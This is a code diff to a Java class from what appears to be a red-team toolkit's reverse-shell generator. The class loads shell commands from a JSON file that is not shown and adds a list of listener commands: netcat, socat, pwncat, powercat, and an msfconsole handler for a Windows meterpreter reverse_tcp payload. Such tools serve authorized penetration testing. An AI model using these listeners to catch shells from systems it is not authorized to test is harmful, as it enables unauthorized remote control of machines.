@@ -1,17 +1,12 @@
 package ffffffff0x.beryenigma.App.Controller.Tools.RedTeam.ReverseShellGenerator;
 
 import com.google.gson.Gson;
-import com.jfoenix.assets.JFoenixResources;
-import com.jfoenix.controls.datamodels.treetable.RecursiveTreeObject;
-import ffffffff0x.beryenigma.Kit.Utils.FileUtils;
-import javafx.beans.property.SimpleStringProperty;
-import javafx.beans.property.StringProperty;
-import javafx.collections.FXCollections;
-import javafx.collections.ObservableList;
-import org.apache.commons.lang3.builder.RecursiveToStringStyle;
 
-import java.io.File;
-import java.util.Objects;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.util.HashMap;
+import java.util.Map;
+import java.util.stream.Collectors;
 
 /**
  * @author: RyuZUSUNC
@@ -19,27 +14,46 @@ import java.util.Objects;
  **/
 
 public class RedTeam_ReverseShellGenerator {
+    private Map<String,String> ListenerType = new HashMap<>();
     private ReverseShellBeans reverseShellBeans;
 
     public RedTeam_ReverseShellGenerator() {
-        String jsonData = FileUtils.getFileString(new File(Objects.requireNonNull(RedTeam_ReverseShellGenerator.class.getResource("/redTeam/ReverseShell.txt")).getFile()));
+        initListenerType();
+        String jsonData = new BufferedReader(new InputStreamReader(RedTeam_ReverseShellGenerator.class.getResourceAsStream("/redTeam/ReverseShell.json")))
+                .lines().collect(Collectors.joining(System.lineSeparator()));
         Gson gson = new Gson();
         reverseShellBeans = gson.fromJson(jsonData, ReverseShellBeans.class);
     }
 
-    public void getAllShellBeans() {
-        ObservableList<shellName> shellNames = FXCollections.observableArrayList();
-        for (ReverseShellBeans.ReverseShellBean shellBean : reverseShellBeans.getData()) {
-            shellNames.add(new shellName(shellBean.getName()));
+    public ReverseShellBeans getReverseShellBeans() {
+        return reverseShellBeans;
+    }
+    
+    public String getReverseShell(String shellType) {
+        for (ReverseShellBeans.ReverseShellBean datum : reverseShellBeans.getData()) {
+            if (datum.getName().equals(shellType)) {
+                return datum.getCommand();
+            }
         }
+        return null;
     }
 
-    private static final class shellName extends RecursiveTreeObject<shellName> {
-        final StringProperty shellName;
-
-        shellName(String name) {
-            this.shellName = new SimpleStringProperty(name);
-        }
+    public String getListener(String listenerType) {
+        return ListenerType.get(listenerType);
     }
 
+    public void initListenerType() {
+        ListenerType.put("nc", "nc -lvnp {port}");
+        ListenerType.put("ncat", "ncat -lvnp {port}");
+        ListenerType.put("ncat (TLS)", "ncat --ssl -lvnp {port}");
+        ListenerType.put("rlwrap + nc", "rlwrap -cAr nc -lvnp {port}");
+        ListenerType.put("rc", "rc -lp {port}");
+        ListenerType.put("rc + Command History", "rc -lHp {port}");
+        ListenerType.put("pwncat", "python3 -m pwncat -lp {port}");
+        ListenerType.put("windows ConPty", "stty raw -echo; (stty size; cat) | nc -lvnp {port}");
+        ListenerType.put("socat", "socat -d -d TCP-LISTEN:{port} STDOUT");
+        ListenerType.put("socat (TTY)", "socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}");
+        ListenerType.put("powercat", "powercat -l -p {port}");
+        ListenerType.put("msfconsole", "msfconsole -q -x \"use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost {ip}; set lport {port}; exploit\"");
+    }
 }
